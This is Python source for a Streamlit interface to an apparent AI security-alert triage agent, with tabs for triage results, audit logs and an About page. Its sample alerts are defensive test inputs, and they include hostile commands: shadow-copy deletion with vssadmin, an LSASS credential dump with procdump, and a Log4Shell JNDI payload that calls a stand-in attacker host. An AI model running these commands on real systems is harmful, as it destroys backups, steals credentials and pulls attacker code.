from __future__ import annotations
"""
AgentReliabilityLab — Streamlit UI
3 tabs: Triage Alert | Audit Logs | About
"""
import json
import os
import time
from pathlib import Path

import streamlit as st

# ── Page config ───────────────────────────────────────────────────────────────
st.set_page_config(
    page_title="AgentReliabilityLab",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# ── Colour palette ────────────────────────────────────────────────────────────
_DECISION_COLOR = {
    "CRITICAL": "#FF4B4B",
    "HIGH":     "#FF8C00",
    "MEDIUM":   "#F4C430",
    "LOW":      "#4A90D9",
    "BENIGN":   "#21C55D",
    "UNKNOWN":  "#9CA3AF",
}
_DECISION_EMOJI = {
    "CRITICAL": "🔴",
    "HIGH":     "🟠",
    "MEDIUM":   "🟡",
    "LOW":      "🔵",
    "BENIGN":   "🟢",
    "UNKNOWN":  "⚪",
}

# ── Sample alerts ─────────────────────────────────────────────────────────────
_SAMPLES = {
    "Ransomware — vssadmin shadow deletion": (
        '{"event_type":"process","process_name":"vssadmin.exe",'
        '"command_line":"vssadmin.exe delete shadows /all /quiet",'
        '"parent_process":"cmd.exe","user":"SYSTEM","endpoint_id":"WIN-DC-01"}'
    ),
    "Credential Dump — LSASS via ProcDump": (
        '{"event_type":"process","process_name":"procdump64.exe",'
        '"command_line":"procdump64.exe -ma lsass.exe lsass.dmp",'
        '"parent_process":"powershell.exe","user":"Administrator","endpoint_id":"WIN-SRV-02"}'
    ),
    "Log4Shell exploitation (CVE-2021-44228)": (
        "IDS ALERT — CVE-2021-44228 Log4Shell Exploitation Attempt. "
        "Source IP: 203.0.113.42. Target: PROD-APP-01:8080. "
        "Payload in User-Agent: ${jndi:ldap://203.0.113.42:1389/Exploit}. HTTP 200 returned."
    ),
    "Cobalt Strike C2 beacon": (
        "IDS ALERT — Rule: COBALT_STRIKE_BEACON. "
        "Endpoint: CORP-WS-31 (10.0.2.88). Outbound HTTPS to 185.220.101.47:443. "
        "Beacon interval: ~60s. JA3 fingerprint matches known Cobalt Strike C2."
    ),
    "RDP lateral movement": (
        "IDS ALERT: 6 RDP connections from 10.0.1.55 to different hosts in 3 minutes. "
        "User: CORP\\svc_backup. NTLM auth."
    ),
    "Phishing — macro-enabled attachment": (
        "Email Security Alert: Macro-enabled attachment Invoice.docm from "
        "spoofed domain it-support@c0rp-helpdesk.com. Sent to 45 recipients."
    ),
    "Benign — scheduled CI/CD deployment": (
        "Accepted publickey for deploy from 10.0.0.5 port 52341 ssh2. "
        "Scheduled CI/CD deployment service account."
    ),
    "Benign — Nessus vulnerability scan": (
        "IDS ALERT — Rule: PORT_SCAN_DETECTED. Source: 10.0.0.200 (Nessus scanner). "
        "Targets: 10.0.0.0/24. Matches scheduled vulnerability scan window (Tuesday 09:00-11:00)."
    ),
}


# ── Helpers ───────────────────────────────────────────────────────────────────

def _decision_badge(decision: str) -> str:
    color = _DECISION_COLOR.get(decision, "#9CA3AF")
    emoji = _DECISION_EMOJI.get(decision, "⚪")
    return (
        f'<span style="background:{color};color:#fff;padding:6px 18px;'
        f'border-radius:6px;font-size:1.4rem;font-weight:700;">'
        f'{emoji} {decision}</span>'
    )


def _load_audit_logs() -> list[dict]:
    audit_dir = Path("audit_logs")
    if not audit_dir.exists():
        return []
    logs = []
    for f in sorted(audit_dir.glob("*.json"), reverse=True):
        try:
            logs.append(json.loads(f.read_text()))
        except Exception:
            pass
    return logs


# ── Tabs ──────────────────────────────────────────────────────────────────────
tab_triage, tab_audit, tab_about = st.tabs(["🛡️ Triage Alert", "📋 Audit Logs", "ℹ️ About"])


# ══════════════════════════════════════════════════════════════════════════════
# TAB 1 — TRIAGE ALERT
# ══════════════════════════════════════════════════════════════════════════════
with tab_triage:
    st.markdown("## 🛡️ Cyber Alert Triage")
    st.markdown(
        "Paste a raw security alert (EDR JSON, Syslog, IDS, SIEM) or pick a sample. "
        "The agent retrieves relevant MITRE ATT&CK / NIST CSF / CISA threat-intel "
        "and produces a structured triage decision."
    )

    col_left, col_right = st.columns([1, 2])

    with col_left:
        sample_choice = st.selectbox("Load a sample alert", ["— paste your own —"] + list(_SAMPLES.keys()))

    alert_text = ""
    if sample_choice != "— paste your own —":
        alert_text = _SAMPLES[sample_choice]

    raw_input = st.text_area(
        "Raw alert text",
        value=alert_text,
        height=160,
        placeholder='Paste EDR JSON, Syslog line, IDS alert, or SIEM event...',
    )

    run_btn = st.button("▶ Run Triage", type="primary", use_container_width=True)

    if run_btn:
        if not raw_input.strip():
            st.error("Please paste an alert or select a sample.")
        else:
            with st.spinner("Agent retrieving threat-intel and analyzing…"):
                try:
                    from pipeline.graph import run_pipeline
                    t0    = time.time()
                    state = run_pipeline(raw_input.strip())
                    elapsed = time.time() - t0
                except Exception as e:
                    st.error(f"Pipeline error: {e}")
                    st.stop()

            decision  = state.get("triage_decision", "UNKNOWN")
            band      = state.get("confidence_band",  "?")
            score     = state.get("confidence_score",  0.0)
            analysis  = state.get("analysis") or {}
            tech_ids  = analysis.get("technique_ids",       [])
            tactics   = analysis.get("tactics",              [])
            rationale = analysis.get("severity_rationale",   "")
            controls  = analysis.get("recommended_controls", [])
            iocs      = analysis.get("ioc_indicators",       [])
            reasons   = state.get("reason_codes",           [])
            human_rev = state.get("human_review_required",  False)
            audit_id  = state.get("audit_id",               "—")
            attempts  = state.get("retrieval_attempts",     0)
            tl        = state.get("token_log",              {})
            error     = state.get("error")

            # ── Decision banner ───────────────────────────────────────────
            st.markdown("---")
            st.markdown(_decision_badge(decision), unsafe_allow_html=True)
            if human_rev:
                st.warning("⚠️ **Human review required** — routed to analyst queue")

            if error:
                st.error(f"Pipeline error: {error}")
            else:
                # ── Metrics row ───────────────────────────────────────────
                m1, m2, m3, m4 = st.columns(4)
                m1.metric("Confidence", f"{score:.0%}", delta=band)
                m2.metric("Retrieval passes", attempts)
                m3.metric("Tokens used", tl.get("total_tokens", 0))
                m4.metric("Latency", f"{elapsed:.1f}s")

                st.markdown("---")
                c1, c2 = st.columns(2)

                with c1:
                    st.markdown("#### 🎯 MITRE ATT&CK Mapping")
                    if tech_ids:
                        for tid in tech_ids:
                            url = f"https://attack.mitre.org/techniques/{tid.replace('.','/')}/"
                            st.markdown(f"- [`{tid}`]({url})")
                    else:
                        st.markdown("*No techniques identified*")

                    st.markdown("#### ⚔️ Tactics")
                    st.markdown(", ".join(tactics) if tactics else "*None*")

                    st.markdown("#### 💡 Rationale")
                    st.markdown(rationale or "*—*")

                with c2:
                    st.markdown("#### 🔧 Recommended Controls (NIST CSF)")
                    if controls:
                        for ctrl in controls:
                            st.markdown(f"- `{ctrl}`")
                    else:
                        st.markdown("*No controls recommended*")

                    st.markdown("#### 🚨 IOC Indicators")
                    if iocs:
                        for ioc in iocs:
                            st.code(ioc, language=None)
                    else:
                        st.markdown("*None extracted*")

                    st.markdown("#### 📌 Reason Codes")
                    st.markdown(", ".join(f"`{r}`" for r in reasons) if reasons else "*—*")

                st.markdown("---")
                st.markdown(f"**Audit ID:** `{audit_id}` &nbsp;|&nbsp; "
                            f"**Alert source:** `{state.get('alert_source','?')}`",
                            unsafe_allow_html=True)


# ══════════════════════════════════════════════════════════════════════════════
# TAB 2 — AUDIT LOGS
# ══════════════════════════════════════════════════════════════════════════════
with tab_audit:
    st.markdown("## 📋 Audit Logs")

    logs = _load_audit_logs()
    if not logs:
        st.info("No audit logs yet. Run a triage first.")
    else:
        import pandas as pd

        rows = []
        for log in logs:
            rows.append({
                "Audit ID":    log.get("audit_id", "—"),
                "Alert ID":    log.get("alert_id", "—"),
                "Source":      log.get("alert_source", "—"),
                "Decision":    log.get("triage_decision", "—"),
                "Severity":    log.get("severity", "—"),
                "Confidence":  f"{log.get('confidence_score', 0):.0%}",
                "Band":        log.get("confidence_band", "—"),
                "Techniques":  ", ".join(log.get("technique_ids", [])) or "—",
                "Human Rev":   "Yes" if log.get("human_review_required") else "No",
                "Tokens":      log.get("token_log", {}).get("total_tokens", 0),
                "Timestamp":   log.get("timestamp", "—")[:19],
                "Error":       log.get("error") or "",
            })

        df = pd.DataFrame(rows)

        # Color-code Decision column
        def _style_decision(val):
            color = _DECISION_COLOR.get(val, "#9CA3AF")
            return f"color: {color}; font-weight: bold"

        st.dataframe(
            df.style.applymap(_style_decision, subset=["Decision"]),
            use_container_width=True,
            hide_index=True,
        )

        st.markdown("---")
        st.markdown("### Full audit record")
        audit_ids = [log.get("audit_id", "?") for log in logs]
        selected  = st.selectbox("Select audit ID", audit_ids)
        if selected:
            record = next((l for l in logs if l.get("audit_id") == selected), None)
            if record:
                st.json(record)


# ══════════════════════════════════════════════════════════════════════════════
# TAB 3 — ABOUT
# ══════════════════════════════════════════════════════════════════════════════
with tab_about:
    st.markdown("## ℹ️ About AgentReliabilityLab")
    st.markdown("""
AgentReliabilityLab is a **production-grade LangGraph agent** that triages raw security
alerts against a hybrid RAG knowledge base of MITRE ATT&CK, NIST CSF 2.0, and CISA advisories.

---

### Agent Pipeline

| Node | What it does |
|---|---|
| **Intake** | Detects source type (EDR/Syslog/IDS/SIEM), extracts IPs/hashes/CVEs, deterministic benign pre-check |
| **Retrieve** | Hybrid BM25 + dense retrieval over MITRE/NIST/CISA → cross-encoder reranking |
| **Analyze** | LLM maps alert → MITRE technique IDs, severity, IOCs, recommended controls |
| **[Loop]** | If `requires_more_context=True` AND attempts < max → re-retrieve with refined query |
| **Confidence** | Heuristic adjustment of LLM self-reported confidence → HIGH/MEDIUM/LOW band |
| **Route** | Severity + technique-level hard overrides → CRITICAL/HIGH/MEDIUM/LOW/BENIGN |
| **Audit** | Tamper-evident JSON log — chunk IDs only, no raw PII, token economics |

---

### Key Design Decisions

**Agentic loop** — if the LLM reports `requires_more_context=True`, the graph re-queries
with a richer, technique-aware query before committing to a decision. Bounded at 2 attempts.

**Deterministic overrides** — T1486/T1490 (ransomware) are always CRITICAL regardless of
LLM severity call. Known-benign patterns (scheduled deployments, Nessus scans) bypass the
LLM entirely: 0.4s, 0 tokens.

**LangSmith observability** — enable with `LANGCHAIN_TRACING_V2=true` in `.env`.
Every node gets a trace with latency, token cost, and prompt/response chain.

**RAGAS eval** — `eval/ragas_eval.py` measures faithfulness, context_recall,
context_precision, and answer_relevancy on retrieval quality independently of routing accuracy.

---

### Stack

`LangGraph 0.2+` · `LM Studio (local)` · `ChromaDB + BM25` · `sentence-transformers`
· `cross-encoder reranker` · `RAGAS` · `LangSmith` · `FastAPI` · `Docker`

---

### Author

**Sidharth Kriplani** · [linkedin.com/in/sidharth-kriplani](https://linkedin.com/in/sidharth-kriplani) ·
[github.com/SidharthKriplani](https://github.com/SidharthKriplani)
""")
